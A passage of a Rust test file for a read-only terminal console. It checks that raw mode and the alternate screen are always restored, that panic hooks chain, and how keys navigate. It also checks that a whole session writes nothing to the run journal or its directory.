        refuse(true, (100, MIN_HEIGHT - 1), true),
    ] {
        let message = refusal.expect("a refusal");
        assert!(message.contains("forge inspect"), "{message}");
        assert!(message.contains("forge watch"), "{message}");
    }
    assert!(refuse(true, (100, 40), false)
        .unwrap()
        .contains("a read never creates one"));
    assert!(refuse(false, (100, 40), true).unwrap().contains("not one"));
    assert!(refuse(true, (10, 40), true).unwrap().contains("10×40"));
}

// ------------------------------------------- AC-12: the terminal lifecycle

/// `set_hook`/`take_hook` and the recorders below are process-global, so
/// every test that touches them takes this first.
static TERMINAL: Mutex<()> = Mutex::new(());
static SCRIPT: Mutex<Vec<Event>> = Mutex::new(Vec::new());
static ENTERED: AtomicUsize = AtomicUsize::new(0);
static LEFT: AtomicUsize = AtomicUsize::new(0);
static RESTORED: AtomicUsize = AtomicUsize::new(0);
static CHAINED: AtomicUsize = AtomicUsize::new(0);

fn script(keys: &[Key]) {
    let mut script = SCRIPT.lock().unwrap();
    script.clear();
    for key in keys {
        let code = match key {
            Key::Enter => KeyCode::Enter,
            Key::Escape => KeyCode::Esc,
            Key::Backspace => KeyCode::Backspace,
            Key::Tab => KeyCode::Tab,
            Key::Up => KeyCode::Up,
            Key::Down => KeyCode::Down,
            Key::PageUp => KeyCode::PageUp,
            Key::PageDown => KeyCode::PageDown,
            Key::Char(character) => KeyCode::Char(*character),
            Key::Quit => KeyCode::Char('q'),
        };
        script.push(Event::Key(KeyEvent::new(code, KeyModifiers::NONE)));
    }
}

fn scripted_poll(_: Duration) -> std::io::Result<bool> {
    Ok(!SCRIPT.lock().unwrap().is_empty())
}

fn scripted_read() -> std::io::Result<Event> {
    Ok(SCRIPT.lock().unwrap().remove(0))
}

fn record_enter() -> std::io::Result<()> {
    ENTERED.fetch_add(1, Ordering::SeqCst);
    Ok(())
}

fn record_leave() -> std::io::Result<()> {
    LEFT.fetch_add(1, Ordering::SeqCst);
    Ok(())
}

fn refuse_raw_mode() -> std::io::Result<()> {
    Err(std::io::Error::other("this terminal refuses raw mode"))
}

fn fixed_size() -> std::io::Result<(u16, u16)> {
    Ok((100, 30))
}

fn record_restore() {
    RESTORED.fetch_add(1, Ordering::SeqCst);
}

fn test_ops() -> TerminalOps {
    TerminalOps {
        enter_raw: record_enter,
        leave_raw: record_leave,
        poll: scripted_poll,
        read: scripted_read,
        size: fixed_size,
    }
}

/// A writer that always refuses: the alternate-screen error path is a
/// real closed pipe, not decoration.
struct ClosedPipe;

impl Write for ClosedPipe {
    fn write(&mut self, _: &[u8]) -> std::io::Result<usize> {
        Err(std::io::Error::other("closed pipe"))
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[test]
fn the_terminal_is_entered_and_left_on_every_path_including_the_error_ones() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();

    // The production ops are crossterm's own function items: this
    // constructs them without invoking one.
    let ops = production_ops();
    assert!(std::ptr::fn_addr_eq(
        ops.enter_raw,
        enable_raw_mode as fn() -> std::io::Result<()>
    ));

    // The alternate-screen sequences are real code against a real
    // writer, with no effect on this process's terminal.
    let mut sink: Vec<u8> = Vec::new();
    execute!(sink, EnterAlternateScreen, Hide).unwrap();
    let bytes = String::from_utf8(sink).unwrap();
    assert!(bytes.contains("\x1b[?1049h"), "{bytes:?}");
    assert!(bytes.contains("\x1b[?25l"), "{bytes:?}");

    // A clean run: enter, draw, quit, restore.
    let entered = ENTERED.load(Ordering::SeqCst);
    let left = LEFT.load(Ordering::SeqCst);
    script(&[Key::Quit]);
    let mut source = |_: Ask| Ok(Some(views()));
    let code = start(
        true,
        None,
        test_ops(),
        true,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        8,
    )
    .unwrap();
    assert_eq!(code, ExitCode::SUCCESS);
    assert_eq!(ENTERED.load(Ordering::SeqCst), entered + 1);
    assert_eq!(
        LEFT.load(Ordering::SeqCst),
        left + 1,
        "the guard's Drop ran"
    );

    // The error path: the alternate-screen write fails, and the guard
    // still restores BEFORE the Err reaches the caller.
    let left = LEFT.load(Ordering::SeqCst);
    let mut source = |_: Ask| Ok(Some(views()));
    let error = start(
        true,
        None,
        test_ops(),
        true,
        TestBackend::new(100, 30),
        ClosedPipe,
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(error.to_string().contains("closed pipe"), "{error}");
    assert_eq!(
        LEFT.load(Ordering::SeqCst),
        left + 1,
        "restored on the error path"
    );

    // Raw mode itself can refuse; nothing is entered and nothing leaks.
    let mut ops = test_ops();
    ops.enter_raw = refuse_raw_mode;
    let mut source = |_: Ask| Ok(Some(views()));
    let error = start(
        true,
        None,
        ops,
        true,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(error.to_string().contains("refuses raw mode"), "{error}");

    // And the startup refusal precedes every one of those effects.
    let mut source = |_: Ask| Ok(Some(views()));
    let refused = start(
        false,
        None,
        test_ops(),
        true,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(refused.to_string().contains("forge watch"), "{refused}");

    std::panic::set_hook(saved);
}

#[test]
fn the_panic_hook_restores_first_chains_second_and_is_put_back_after() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {
        CHAINED.fetch_add(1, Ordering::SeqCst);
    }));

    let restored = RESTORED.load(Ordering::SeqCst);
    let chained = CHAINED.load(Ordering::SeqCst);
    install_panic_hook(record_restore);
    let panicked = std::panic::catch_unwind(|| panic!("a deliberate panic"));
    assert!(panicked.is_err());
    assert_eq!(
        RESTORED.load(Ordering::SeqCst),
        restored + 1,
        "the terminal is restored first"
    );
    assert_eq!(
        CHAINED.load(Ordering::SeqCst),
        chained + 1,
        "and the previous hook still ran"
    );

    // Installing twice is harmless: each layer restores and chains.
    install_panic_hook(record_restore);
    let panicked = std::panic::catch_unwind(|| panic!("again"));
    assert!(panicked.is_err());
    assert_eq!(RESTORED.load(Ordering::SeqCst), restored + 3);

    let _ = std::panic::take_hook();
    std::panic::set_hook(saved);

    // The production restore is error-swallowing by construction: with
    // no terminal attached it does nothing and cannot panic.
    restore_stdout();
}

// --------------------------------------------------------- AC-9: the shell

#[test]
fn the_shell_redraws_keeps_keys_live_through_a_bad_journal_and_gives_up_at_last() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();

    // A source that answers "nothing moved" keeps the frame it has.
    script(&[Key::Down, Key::Char('r'), Key::Quit]);
    let mut answers = 0usize;
    let mut forced: Vec<bool> = Vec::new();
    let mut source = |ask: Ask| {
        answers += 1;
        forced.push(ask.force);
        match answers {
            1 => Ok(Some(views())),
            _ => Ok(None),
        }
    };
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 9).unwrap();
    assert_eq!(code, ExitCode::SUCCESS);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "the key arrived");
    assert_eq!(
        forced,
        vec![true, false, true],
        "the first frame forces, and so does `r` — nothing else does"
    );

    // A transient store error is a frame that SAYS SO, with keys still
    // live — a console the operator cannot quit for ten seconds is not
    // a console.
    script(&[Key::Char('j'), Key::Quit]);
    let mut source = |_: Ask| Err(anyhow::anyhow!("database is locked"));
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 2).unwrap();
    assert_eq!(code, ExitCode::SUCCESS, "q was handled while unreadable");
    assert!(tui
        .status
        .as_deref()
        .unwrap()
        .contains("the journal is not readable right now"));

    // A persistent one gives up past the constant `watch` already uses.
    let mut source = |_: Ask| Err(anyhow::anyhow!("database is locked"));
    let mut tui = Tui::new(None);
    let error = drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        crate::WATCH_TRANSIENT_FRAMES + 2,
    )
    .unwrap_err();
    assert!(error.to_string().contains("unreadable polls"), "{error}");

    // The fleet's slower cadence is asked for on the named tick, and a
    // key that binds to nothing is simply not a key.
    SCRIPT.lock().unwrap().clear();
    SCRIPT
        .lock()
        .unwrap()
        .push(Event::Key(KeyEvent::new(KeyCode::Home, KeyModifiers::NONE)));
    let mut fleets = 0usize;
    let mut source = |ask: Ask| {
        if ask.fleet {
            fleets += 1;
        }
        Ok(Some(views()))
    };
    let mut tui = Tui::new(None);
    drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        RUNS_REFRESH_TICKS + 1,
    )
    .unwrap();
    assert_eq!(fleets, 2, "once at the first frame, once on the cadence");

    std::panic::set_hook(saved);
}

#[test]
fn the_shell_asks_for_the_seats_session_only_while_that_seat_is_open() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    script(&[
        Key::Down,
        Key::Enter,
        Key::Tab,
        Key::Down,
        Key::Enter,
        Key::Enter,
        Key::Quit,
    ]);
    let mut asked: Vec<Option<String>> = Vec::new();
    let mut source = |ask: Ask| {
        asked.push(ask.session.map(str::to_string));
        Ok(Some(views()))
    };
    let mut tui = Tui::new(None);
    drive(&mut terminal, &test_ops(), &mut source, &mut tui, 12).unwrap();
    assert!(
        asked
            .iter()
            .any(|session| session.as_deref() == Some("abcd-1234")),
        "the open seat's session id is a model field: {asked:?}"
    );
    assert!(
        asked.first().unwrap().is_none(),
        "and nothing is read before a seat is open"
    );
}

/// A panel with no sequence steps: one fork, no step label. The other
/// shape the tree draws.
fn panel_views() -> Views {
    let mut events = vec![
        ev(1, EventType::RunStarted, json!({"feature": "a panel"}), T0),
        ev(2, EventType::PhaseEntered, json!({"phase": "review"}), T0),
        ev(
            3,
            EventType::EffectRequested,
            json!({"effect_id": "eff-p", "seat": "review", "phase": "review"}),
            T0,
        ),
        ev(
            4,
            EventType::EffectStarted,
            json!({"effect_id": "eff-p", "attempt_id": "att"}),
            T0,
        ),
    ];
    for (seq, member) in [(5, "security"), (6, "correctness")] {
        events.push(ev(
            seq,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-p", "attempt_id": "att",
                   "checkpoint": {"member": member, "step": "seat-turn", "turn": 1,
                                  "tool": "Grep"}}),
            T0,
        ));
    }
    let stopped = state_of(Status::Stopped);
    Views {
        now: NOW.to_string(),
        runs: forge_view::run_rows(&[forge_view::RunEntry {
            run_id: "run-stopped",
            feature: "a run that stopped",
            created_at: T0,
            state: Some(&stopped),
        }]),
        run: Some(forge_view::run_view(&events, Some(&stopped))),
        transcript: None,
    }
}

#[test]
fn the_keys_lists_and_tints_a_console_still_needs_are_all_there() {
    let views = views();

    // Ctrl with any other key is not the quit binding.
    assert_eq!(
        from_crossterm(Event::Key(KeyEvent::new(
            KeyCode::Char('d'),
            KeyModifiers::CONTROL
        ))),
        Some(Key::Char('d'))
    );

    // `Key::Quit` is what Ctrl+C becomes, and it quits from anywhere.
    let mut tui = Tui::new(None);
    assert_eq!(apply(&mut tui, &views, Key::Quit), Flow::Quit);

    // ↑ and k move alike; an unbound letter is not a command.
    apply(&mut tui, &views, Key::Up);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "newest first");
    apply(&mut tui, &views, Key::Char('k'));
    assert_eq!(tui.cursor[0].as_deref(), Some("run-unfoldable"), "k wraps");
    let held = tui.cursor[0].clone();
    apply(&mut tui, &views, Key::Char('x'));
    assert_eq!(tui.cursor[0], held);

    // The trail is a list of its own — and Enter there is a no-op,
    // because the trail is evidence, not a door.
    let mut tui = at_run();
    tui.pane = 2;
    let trail = keys_for(&tui, &views);
    assert!(!trail.is_empty(), "the trail lists its rows by seq");
    assert!(
        trail.len() < views.run.as_ref().unwrap().journal.len(),
        "and the checkpoints the trail hides are not in it"
    );
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert!(tui.scope.is_none());

    // The PARTICIPANT panes are paragraphs: no list, nothing to filter.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert!(keys_for(&tui, &views).is_empty());

    // A seat scope with the cursor elsewhere names the verb that
    // applies to THIS row, not to the scoped one.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    tui.cursor[1] = Some("eff-d".to_string());
    assert!(footer_for(&tui).contains("Enter scope seat"));
}

#[test]
fn a_filtered_fleet_a_stopped_run_a_bare_fork_and_a_whole_transcript_all_draw() {
    // A filter hides rows from the table it was typed over.
    let views = views();
    let mut tui = Tui::new(None);
    tui.filter = "run-7".to_string();
    let frame = frame_of(&tui, &views, 100, 20);
    assert!(frame.contains("run-7"));
    assert!(
        !frame.contains("run-old"),
        "the filter hides a row: {frame}"
    );

    // A stopped run and a fork with no step name: the other tone and
    // the other tree shape.
    let panel = panel_views();
    let tui = Tui::new(None);
    let frame = frame_of(&tui, &panel, 100, 20);
    assert!(frame.contains("stopped"), "{frame}");
    let tui = Tui::new(Some("run-stopped".to_string()));
    let frame = frame_of(&tui, &panel, 110, 30);
    assert!(frame.contains('⑂'), "a bare fork: {frame}");
    assert!(frame.contains("security"), "{frame}");
    assert!(frame.contains("correctness"), "{frame}");

    // A transcript that fits carries no truncation line.
    let mut views = views;
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "user".to_string(),
            ts: T0.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "tool",
                text: "Read · docs/decisions/0014-interactive-tui.md".to_string(),
            }],
        }],
        false,
    ));
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("Read · docs"), "{frame}");
    assert!(!frame.contains("truncated"), "{frame}");
}

// -------------------------------------------- AC-15, AC-17: the boundaries

/// The file itself is the evidence: a renderer that cannot name a store
/// cannot write to one, and a widget layer with exactly two sanitized
/// constructors cannot be handed raw journal text.
const SOURCE: &str = include_str!("../tui.rs");

#[test]
fn the_tui_source_names_no_store_no_runtime_and_no_unsanitized_widget() {
    for forbidden in ["Store", "forge_runtime", "append_next", "create_run"] {
        assert!(
            !SOURCE.contains(forbidden),
            "tui.rs must not name {forbidden}: the console is read-only"
        );
    }
    // The TUI returns an ExitCode like every other arm: a
    // `process::exit` would run past the guard's Drop and leave the
    // operator's terminal in raw mode.
    assert!(!SOURCE.contains("process::exit"));
    // Exactly one constructor of each, and both take sanitized text.
    assert_eq!(SOURCE.matches("Cell::from(").count(), 1);
    assert_eq!(SOURCE.matches("Span::styled(").count(), 1);
    assert_eq!(SOURCE.matches("Span::raw(").count(), 0);
    assert_eq!(SOURCE.matches("Paragraph::new(\"").count(), 0);
    // And no derivation: no status table, no cost or duration
    // arithmetic, no topology, no scope predicate of its own.
    for derived in [
        "fn status_code",
        "fn fmt_dur",
        "to_fixed_4",
        "fn age",
        "total_cost_usd",
    ] {
        assert!(
            !SOURCE.contains(derived),
            "tui.rs must not derive {derived}"
        );
    }
}

/// A directory tree as bytes: relative path, length, content. Comparing
/// this before and after is what "the operator's disk looks the same
/// afterwards" actually means — an NDJSON export alone passes cleanly
/// through a created database, a WAL and a migration.
fn tree(dir: &Path) -> Vec<(String, usize, Vec<u8>)> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let path = entry.path();
        let name = path.file_name().unwrap().to_string_lossy().to_string();
        if path.is_dir() {
            for (child, len, bytes) in tree(&path) {
                out.push((format!("{name}/{child}"), len, bytes));
            }
            continue;
        }
        let bytes = std::fs::read(&path).unwrap();
        out.push((name, bytes.len(), bytes));
    }
    out.sort();
    out
}

#[test]
fn a_whole_tui_session_writes_nothing_at_all() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let dir = tempfile::tempdir().unwrap();
    let db = dir.path().join("forge.db");
    {
        let mut store = Store::open(&db).unwrap();
        store
            .create_run(
                "run-proof",
                "a proof feature",
                "test",
                &json!({"files": {}}),
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::RunStarted,
                json!({"feature": "a proof feature", "manifest": {}}),
                None,
                None,
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::PhaseEntered,
                json!({"phase": "work"}),
                None,
                None,
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::EffectRequested,
                json!({"effect_id": "eff", "seat": "work", "phase": "work"}),
                None,
                None,
            )
            .unwrap();
    }
    let before_ndjson = Store::open(&db)
        .unwrap()
        .export_ndjson("run-proof")
        .unwrap();
    let before_tree = tree(dir.path());

    // Every navigation path, driven headlessly through the real
    // refresh source: descend, scope, descend again, filter, page,
    // help, refresh, ascend by both keys, and quit.
    script(&[
        Key::Down,
        Key::Enter,
        Key::Down,
        Key::Enter,
        Key::Escape,
        Key::Tab,
        Key::Down,
        Key::Enter,
        Key::Enter,
        Key::Down,
        Key::PageDown,
        Key::Tab,
        Key::Char('G'),
        Key::Backspace,
        Key::Char('/'),
        Key::Char('w'),
        Key::Enter,
        Key::Escape,
        Key::Char('r'),
        Key::Char('?'),
        Key::Escape,
        Key::Escape,
        Key::Quit,
    ]);
    let mut head = None;
    let mut source = |ask: Ask| crate::tui_views(&db, ask, &mut head, || NOW.to_string());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 40).unwrap();
    assert_eq!(code, ExitCode::SUCCESS);

    assert_eq!(
        Store::open(&db)
            .unwrap()
            .export_ndjson("run-proof")
            .unwrap(),
        before_ndjson,
        "the journal is byte-identical"
    );
    assert_eq!(
        tree(dir.path()),
        before_tree,
        "and so is the whole directory"
    );
}
